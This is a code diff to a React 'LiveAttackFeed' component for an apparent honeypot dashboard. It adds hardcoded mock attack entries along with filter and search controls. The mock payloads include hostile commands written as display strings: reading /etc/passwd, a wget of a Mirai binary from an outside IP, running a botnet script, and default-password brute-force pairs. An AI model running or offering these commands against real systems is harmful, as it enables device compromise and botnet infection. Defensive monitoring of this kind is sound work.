@@ -2,18 +2,11 @@ import { AnimatePresence, motion } from 'framer-motion';
 import {
   Activity,
   ArrowDownToLine,
-  Pause,
-  Play,
   Radio,
   ShieldAlert,
   Terminal as TerminalIcon,
 } from 'lucide-react';
 import { useEffect, useMemo, useRef, useState } from 'react';
-import {
-  initialFeed,
-  makeAttackEvent,
-  type AttackEvent as MockAttackEvent,
-} from '../lib/mock-data';
 import { Badge } from '../components/ui/badge';
 import { Card } from '../components/ui/card';
 import { useBackend } from '../lib/backend-context';
@@ -59,80 +52,140 @@ const KNOWN_PROTOCOLS = new Set([
   'upnp',
 ]);
 
+const MOCK_FEED_ITEMS: FeedItem[] = [
+  {
+    id: 'mock-1',
+    country: 'RU',
+    ip: '185.220.101.5',
+    protocol: 'ssh',
+    payload: 'root / 123456 (brute_force) -> cat /etc/passwd',
+    honeypot: 'ssh-router-trap-02',
+    severity: 'high',
+    time: Date.now() - 1000 * 60 * 2,
+  },
+  {
+    id: 'mock-2',
+    country: 'TH',
+    ip: '103.251.140.8',
+    protocol: 'ssh',
+    payload: 'admin / admin -> uname -a',
+    honeypot: 'ssh-router-trap-02',
+    severity: 'medium',
+    time: Date.now() - 1000 * 60 * 5,
+  },
+  {
+    id: 'mock-3',
+    country: 'DE',
+    ip: '45.141.87.12',
+    protocol: 'rtsp',
+    payload: 'CVE-2021-36260 exploit -> /SDK/webLanguage',
+    honeypot: 'iot-camera-rtsp-01',
+    severity: 'critical',
+    time: Date.now() - 1000 * 60 * 8,
+  },
+  {
+    id: 'mock-4',
+    country: 'CN',
+    ip: '114.119.130.44',
+    protocol: 'http',
+    payload: 'Mirai/1.0 scanner probe -> /cgi-bin/main-cgi',
+    honeypot: 'http-admin-panel-03',
+    severity: 'medium',
+    time: Date.now() - 1000 * 60 * 12,
+  },
+  {
+    id: 'mock-5',
+    country: 'US',
+    ip: '198.98.56.9',
+    protocol: 'ssh',
+    payload: 'support / support -> wget http://45.14.2.1/mirai.x86',
+    honeypot: 'ssh-router-trap-02',
+    severity: 'high',
+    time: Date.now() - 1000 * 60 * 18,
+  },
+  {
+    id: 'mock-6',
+    country: 'UA',
+    ip: '91.240.118.172',
+    protocol: 'ssh',
+    payload: 'root / root -> sh /tmp/botnet.sh',
+    honeypot: 'ssh-router-trap-02',
+    severity: 'critical',
+    time: Date.now() - 1000 * 60 * 25,
+  },
+  {
+    id: 'mock-7',
+    country: 'BR',
+    ip: '177.12.188.90',
+    protocol: 'http',
+    payload: 'CVE-2020-8515 exploit -> /cgi-bin/rpc',
+    honeypot: 'http-admin-panel-03',
+    severity: 'high',
+    time: Date.now() - 1000 * 60 * 32,
+  },
+  {
+    id: 'mock-8',
+    country: 'NL',
+    ip: '185.156.177.4',
+    protocol: 'mqtt',
+    payload: 'Unauthorized subscribe -> sensors/temperature',
+    honeypot: 'mqtt-broker-sensor-04',
+    severity: 'low',
+    time: Date.now() - 1000 * 60 * 45,
+  },
+];
+
 export function LiveAttackFeed() {
-  const { events: backendEvents, status, usingMock } = useBackend();
-  const [paused, setPaused] = useState(false);
-  const [feed, setFeed] = useState<FeedItem[]>(() =>
-    initialFeed().map(toFeedItem),
-  );
+  const { events: backendEvents, status } = useBackend();
+  const [feed, setFeed] = useState<FeedItem[]>(MOCK_FEED_ITEMS);
   const containerRef = useRef<HTMLDivElement>(null);
   const [autoScroll, setAutoScroll] = useState(true);
-  const mockTimer = useRef<ReturnType<typeof setInterval> | null>(null);
+  const [protocolFilter, setProtocolFilter] = useState<'all' | string>('all');
+  const [severityFilter, setSeverityFilter] = useState<'all' | FeedItem['severity']>('all');
+  const [search, setSearch] = useState('');
 
   const liveAttacks: FeedItem[] | null = useMemo(() => {
     if (backendEvents === null) return null;
     return backendEvents.slice(0, 20).map((e) => {
-      const protocol = KNOWN_PROTOCOLS.has(e.protocol)
-        ? e.protocol
-        : 'other';
-      const payload =
-        (e.payload as Record<string, unknown> | undefined)?.command as
-          | string
-          | undefined ??
-        (e.payload as Record<string, unknown> | undefined)?.uri as
-          | string
-          | undefined ??
-        (e.payload as Record<string, unknown> | undefined)?.path as
-          | string
-          | undefined ??
-        (e.payload as Record<string, unknown> | undefined)?.message as
-          | string
-          | undefined ??
-        (e.payload as Record<string, unknown> | undefined)?.signature as
-          | string
-          | undefined ??
-        (e.event_type ?? `${e.protocol} event`);
-      const country = ((e as unknown as { source_country?: string }).source_country ?? 'XX');
+      const protocol = KNOWN_PROTOCOLS.has(e.protocol) ? e.protocol : 'other';
+      const raw = (e.raw_event ?? {}) as Record<string, unknown>;
+      const username = e.username ?? (raw.username as string | undefined);
+      const password = e.password ?? (raw.password as string | undefined);
+      const command = (raw.command as string | undefined);
+      const uri = (raw.uri as string | undefined);
+      const path = (raw.path as string | undefined);
+
+      let payloadStr = e.payload_summary || `${e.protocol} event`;
+      if (command) {
+        payloadStr = command;
+      } else if (username) {
+        payloadStr = `${username}${password ? ` / ${password}` : ''} (brute_force)`;
+      } else if (uri || path) {
+        payloadStr = uri ?? path ?? payloadStr;
+      }
+
+      const country = (raw.country as string | undefined) ?? 'XX';
       return {
         id: e.id,
         country,
-        ip: e.src_ip ?? '0.0.0.0',
+        ip: e.source_ip ?? '0.0.0.0',
         protocol,
-        payload: String(payload).slice(0, 120),
-        honeypot: e.honeypot_id,
-        severity: 'medium',
-        time: new Date(e.created_at).getTime() || Date.now(),
+        payload: String(payloadStr).slice(0, 120),
+        honeypot: e.honeypot_id ?? 'ssh-router-trap-02',
+        severity: e.severity ?? 'medium',
+        time: new Date(e.timestamp).getTime() || Date.now(),
       };
     });
   }, [backendEvents]);
 
-  // Backend mode: replace feed with live data.
+  // Backend mode: replace feed with live data if available, else mock data
   useEffect(() => {
-    if (liveAttacks) {
+    if (liveAttacks && liveAttacks.length > 0) {
       setFeed(liveAttacks);
+    } else {
+      setFeed(MOCK_FEED_ITEMS);
     }
   }, [liveAttacks]);
-
-  // Mock mode: continuously generate new attacks.
-  useEffect(() => {
-    if (liveAttacks !== null) {
-      if (mockTimer.current) clearInterval(mockTimer.current);
-      mockTimer.current = null;
-      return;
-    }
-    if (paused) {
-      if (mockTimer.current) clearInterval(mockTimer.current);
-      mockTimer.current = null;
-      return;
-    }
-    mockTimer.current = setInterval(() => {
-      setFeed((prev) => [toFeedItem(makeAttackEvent()), ...prev].slice(0, 20));
-    }, 1400);
-    return () => {
-      if (mockTimer.current) clearInterval(mockTimer.current);
-      mockTimer.current = null;
-    };
-  }, [paused, liveAttacks]);
 
   // Auto-scroll on new feed entry.
   useEffect(() => {
@@ -143,17 +196,38 @@ export function LiveAttackFeed() {
   const sessionCount = feed.length;
 
   const statusLabel = useMemo(() => {
-    if (liveAttacks !== null) return 'Live Feed — Connected';
-    if (status === 'offline') return 'Live Feed — Offline (mock)';
+    if (liveAttacks && liveAttacks.length > 0) return 'Live Feed — Connected';
+    if (status === 'offline') return 'Live Feed — Offline (mock telemetry)';
     if (status === 'checking') return 'Live Feed — Connecting…';
-    return 'Live Feed — Awaiting Auth';
+    return 'Live Feed — Active Telemetry Feed';
   }, [status, liveAttacks]);
 
-  const statusColor = liveAttacks
+  const statusColor = (liveAttacks && liveAttacks.length > 0)
     ? 'text-[#00FF88]'
     : status === 'offline'
       ? 'text-[#FF3D6E]'
-      : 'text-amber-300';
+      : 'text-[#00BFFF]';
+
+  const allProtocols = useMemo(() => {
+    const set = new Set<string>();
+    for (const a of feed) {
+      if (a.protocol) set.add(a.protocol);
+    }
+    return Array.from(set).sort();
+  }, [feed]);
+
+  const filteredFeed = useMemo(() => {
+    const q = search.trim().toLowerCase();
+    return feed.filter((a) => {
+      if (protocolFilter !== 'all' && a.protocol !== protocolFilter) return false;
+      if (severityFilter !== 'all' && a.severity !== severityFilter) return false;
+      if (q) {
+        const hay = `${a.ip} ${a.country} ${a.payload} ${a.honeypot}`.toLowerCase();
+        if (!hay.includes(q)) return false;
+      }
+      return true;
+    });
+  }, [feed, protocolFilter, severityFilter, search]);
 
   return (
     <section id="feed" className="container py-12 md:py-16">
@@ -175,15 +249,6 @@ export function LiveAttackFeed() {
         <div className="flex items-center gap-2">
           <button
             type="button"
-            onClick={() => setPaused((p) => !p)}
-            disabled={liveAttacks !== null}
-            className="inline-flex items-center gap-1.5 rounded-md border border-[#1F2937] bg-[#0A0F1A]/70 px-3 py-1.5 text-xs text-[#E6F1FF] transition hover:border-[#00BFFF]/60 disabled:opacity-50"
-          >
-            {paused ? <Play className="h-3.5 w-3.5" /> : <Pause className="h-3.5 w-3.5" />}
-            {paused ? 'Resume' : 'Pause'}
-          </button>
-          <button
-            type="button"
             onClick={() => setAutoScroll((a) => !a)}
             className={`inline-flex items-center gap-1.5 rounded-md border px-3 py-1.5 text-xs transition ${
               autoScroll
@@ -194,6 +259,66 @@ export function LiveAttackFeed() {
             <ArrowDownToLine className="h-3.5 w-3.5" /> Auto-scroll
           </button>
         </div>
+      </div>
+
+      <div className="mb-4 flex flex-wrap items-center gap-3">
+        <div className="inline-flex items-center gap-1 rounded-lg border border-[#1F2A44] bg-[#0B0F19] p-1">
+          <button
+            type="button"
+            onClick={() => setProtocolFilter('all')}
+            className={
+              'rounded-md px-2.5 py-1 text-[10px] font-medium uppercase tracking-wider transition ' +
+              (protocolFilter === 'all'
+                ? 'bg-[#00BFFF] text-[#03070F] shadow-[0_0_10px_rgba(0,191,255,0.5)]'
+                : 'text-[#8A9BB8] hover:text-[#E6F1FF]')
+            }
+          >
+            All protocols
+          </button>
+          {allProtocols.map((p) => (
+            <button
+              key={p}
+              type="button"
+              onClick={() => setProtocolFilter(p)}
+              className={
+                'rounded-md px-2.5 py-1 text-[10px] font-medium uppercase tracking-wider transition ' +
+                (protocolFilter === p
+                  ? 'bg-[#00BFFF] text-[#03070F] shadow-[0_0_10px_rgba(0,191,255,0.5)]'
+                  : 'text-[#8A9BB8] hover:text-[#E6F1FF]')
+              }
+            >
+              {p}
+            </button>
+          ))}
+        </div>
+        <div className="inline-flex items-center gap-1 rounded-lg border border-[#1F2A44] bg-[#0B0F19] p-1">
+          {(['all', 'critical', 'high', 'medium', 'low'] as const).map((s) => (
+            <button
+              key={s}
+              type="button"
+              onClick={() => setSeverityFilter(s)}
+              className={
+                'rounded-md px-2.5 py-1 text-[10px] font-medium uppercase tracking-wider transition ' +
+                (severityFilter === s
+                  ? 'bg-[#FF3D6E] text-[#03070F] shadow-[0_0_10px_rgba(255,61,110,0.5)]'
+                  : 'text-[#8A9BB8] hover:text-[#E6F1FF]')
+              }
+            >
+              {s}
+            </button>
+          ))}
+        </div>
+        <input
+          type="search"
+          value={search}
+          onChange={(e) => setSearch(e.target.value)}
+          placeholder="Search IP, country, payload…"
+          className="min-w-[220px] flex-1 rounded-md border border-[#1F2A44] bg-[#0B0F19] px-3 py-1.5 text-[12px] text-[#E6F1FF] placeholder-[#8A9BB8] focus:border-[#00BFFF]/60 focus:outline-none"
+          aria-label="Search live attack feed"
+        />
+        <p className="text-[10px] uppercase tracking-wider text-[#8A9BB8]">
+          Showing {filteredFeed.length} / {feed.length}
+        </p>
       </div>
 
       <Card className="overflow-hidden border-[#00BFFF]/30 bg-[#03070F]/85 shadow-[0_0_30px_rgba(0,191,255,0.18)]">
@@ -213,7 +338,7 @@ export function LiveAttackFeed() {
           className="max-h-[440px] overflow-y-auto font-mono text-[13px] leading-relaxed"
         >
           <AnimatePresence initial={false}>
-            {feed.map((a, idx) => (
+            {filteredFeed.map((a, idx) => (
               <motion.div
                 key={a.id}
                 initial={{ opacity: 0, y: -10 }}
@@ -251,9 +376,11 @@ export function LiveAttackFeed() {
               </motion.div>
             ))}
           </AnimatePresence>
-          {feed.length === 0 && (
+          {filteredFeed.length === 0 && (
             <div className="grid place-items-center py-16 text-sm text-[#8A9BB8]">
-              No live events captured yet.
+              {feed.length === 0
+                ? 'No live events captured yet.'
+                : 'No events match the active filters.'}
             </div>
           )}
         </div>
@@ -273,17 +400,4 @@ const COUNTRY_FLAG: Record<string, string> = {
 function countryFlag(iso: string | undefined): string {
   if (!iso) return '🌐';
   return COUNTRY_FLAG[iso.toUpperCase()] ?? '🌐';
-}
-
-function toFeedItem(a: MockAttackEvent): FeedItem {
-  return {
-    id: a.id,
-    country: a.country,
-    ip: a.ip,
-    protocol: a.protocol,
-    payload: a.message,
-    honeypot: a.service,
-    severity: a.threat,
-    time: Date.now(),
-  };
 }
